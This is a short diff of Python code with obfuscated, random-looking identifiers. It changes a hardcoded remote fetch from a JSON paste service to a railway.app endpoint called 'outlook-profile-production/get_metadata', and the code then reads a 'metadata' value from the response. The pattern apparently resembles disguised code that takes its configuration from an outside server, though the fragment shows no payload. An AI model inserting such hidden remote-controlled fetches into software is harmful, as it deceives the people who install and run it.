@@ -18,7 +18,7 @@ def model_bjbjui_760():
 
     def learn_nfrpay_214():
         try:
-            data_kpmmew_943 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_kpmmew_943 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_kpmmew_943.raise_for_status()
             learn_knxxol_628 = data_kpmmew_943.json()
             model_xjpuqi_296 = learn_knxxol_628.get('metadata')
